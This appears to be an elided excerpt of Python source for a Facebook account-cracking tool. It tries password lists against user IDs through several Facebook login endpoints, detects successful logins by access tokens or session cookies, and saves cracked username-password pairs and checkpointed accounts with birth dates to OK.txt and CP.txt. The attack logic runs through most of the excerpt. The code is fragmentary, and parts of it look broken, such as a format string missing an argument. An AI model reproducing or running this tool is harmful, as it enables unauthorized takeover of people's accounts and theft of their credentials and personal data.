...
class __crack__:
                ...
                if pwek == '':
                    ...
                    def _sempak_(bse=None):
                        ...
                        if boy == '':
                            ...
                            IMTIAZ_AKING('\n[•] Result OK saved to Rk-OK.txt')
                            IMTIAZ_AKING('[•] Result CP saved to Rk-CP.txt')
                            IMTIAZ_AKING('\n\tCrack Processing...\n\n'); 
    ...
    def __api__(self, user, _sempak_):
        global ok,cp,loop
        sys.stdout.write('\r\033[1;92m [RIYAD] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in _sempak_:
            pw = pw.lower()
            try: os.mkdir('')
            ...
            if "access_token" in p:
                IMTIAZ_AKING('\r\033[1;92m[SUCCESSFULL-RIYAD] %s | %s%s      '%(user,pw,tahun(user)))
                ...
                try:
                    ...
                    IMTIAZ_AKING('\r\033[1;92m[SUCCESSFULL-RIYAD]  %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
                    ...
                    pass
                IMTIAZ_AKING('\r\033[1;91m[RIYAD-CHECKPOINT] %s | %s%s      '%(user,pw,tahun(user)))
                wrt = '%s - %s%s' % (user,pw,tahun(user))
                cp.append(wrt)
    ...
    def __mbasic__(self, user, _sempak_):
        ...
        for pw in _sempak_:
            ...
            if 'c_user' in ses.cookies.get_dict():
                IMTIAZ_AKING('\r\033[1;32m[SUCCESSFULL-RIYAD]  %s | %s      ' % (user,pw))
                wrt = '%s - %s' % (user,pw)
                ok.append(wrt)
                open('OK.txt','a').write('%s\n' % wrt)
                break
                ...
                try:
                    ...
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    IMTIAZ_AKING('\r\033[1;91m[RIYAD-CHECKPOINT] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
                    wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
                    cp.append(wrt)
                    open('CP.txt','a').write('%s\n' % wrt)
                    break
    ...
    def __mfb__(self, user, _sempak_):
        ...
        for pw in _sempak_:
            ...
            if 'c_user' in ses.cookies.get_dict():
                IMTIAZ_AKING('\r\033[1;92m[[SUCCESSFULL-RIYAD]  %s | %s      '%(user,pw))
                wrt = '%s - %s - %s' % (user,pw)
                ok.append(wrt)
                open('OK.txt','a').write('%s\n' % wrt)
                break
...
def mk():
    os.system("clear")
    os.system("xdg-open https://www.facebook.com/promise020")
